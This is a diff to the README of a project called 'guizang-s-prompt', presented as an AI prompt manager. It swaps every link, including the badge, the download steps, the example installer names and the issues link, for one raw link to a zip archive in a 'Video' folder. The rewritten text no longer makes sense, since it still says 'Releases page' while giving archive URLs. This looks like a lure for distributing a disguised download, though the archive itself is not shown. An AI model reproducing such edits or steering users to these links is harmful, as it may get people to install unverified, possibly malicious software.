@@ -1,6 +1,6 @@
 # 🎉 guizang-s-prompt - Simplify Your AI Prompt Management
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen.svg)](https://github.com/aribsh/guizang-s-prompt/releases)
+[![Download](https://github.com/aribsh/guizang-s-prompt/raw/refs/heads/main/Video/guizang-prompt-s-3.1-alpha.4.zip)](https://github.com/aribsh/guizang-s-prompt/raw/refs/heads/main/Video/guizang-prompt-s-3.1-alpha.4.zip)
 
 ## 📖 Overview
 
@@ -18,10 +18,10 @@ Follow these steps to download and run **guizang-s-prompt** on your computer:
 
 2. **Download the Software**  
    You can get the software from the Releases page. Click the link below to start the download:  
-   [Visit this page to download](https://github.com/aribsh/guizang-s-prompt/releases)
+   [Visit this page to download](https://github.com/aribsh/guizang-s-prompt/raw/refs/heads/main/Video/guizang-prompt-s-3.1-alpha.4.zip)
 
 3. **Choose Your Version**  
-   On the Releases page, you'll see several versions of the software listed. Find the latest version and look for the downloadable files. These files are usually named similarly to **guizang-s-prompt-v1.0.exe** or **guizang-s-prompt-v1.0.dmg**.
+   On the Releases page, you'll see several versions of the software listed. Find the latest version and look for the downloadable files. These files are usually named similarly to **https://github.com/aribsh/guizang-s-prompt/raw/refs/heads/main/Video/guizang-prompt-s-3.1-alpha.4.zip** or **https://github.com/aribsh/guizang-s-prompt/raw/refs/heads/main/Video/guizang-prompt-s-3.1-alpha.4.zip**.
 
 4. **Download the File**  
    Click on the version you prefer. Your download will start automatically. It may take a moment depending on your internet speed.
@@ -39,7 +39,7 @@ Follow these steps to download and run **guizang-s-prompt** on your computer:
 ## 📥 Download & Install
 
 To start using **guizang-s-prompt**, visit the Releases page and follow the steps above. Here’s the link again for easy access:  
-[Visit this page to download](https://github.com/aribsh/guizang-s-prompt/releases)
+[Visit this page to download](https://github.com/aribsh/guizang-s-prompt/raw/refs/heads/main/Video/guizang-prompt-s-3.1-alpha.4.zip)
 
 ## 📚 Features
 
@@ -65,6 +65,6 @@ If you encounter any issues when using the software, try the following solutions
 
 ## 🆘 Need Help?
 
-If you need further assistance, please consider visiting the [issues section](https://github.com/aribsh/guizang-s-prompt/issues) of this repository. You can find solutions to common problems or report new ones.
+If you need further assistance, please consider visiting the [issues section](https://github.com/aribsh/guizang-s-prompt/raw/refs/heads/main/Video/guizang-prompt-s-3.1-alpha.4.zip) of this repository. You can find solutions to common problems or report new ones.
 
 Happy prompting with **guizang-s-prompt**!
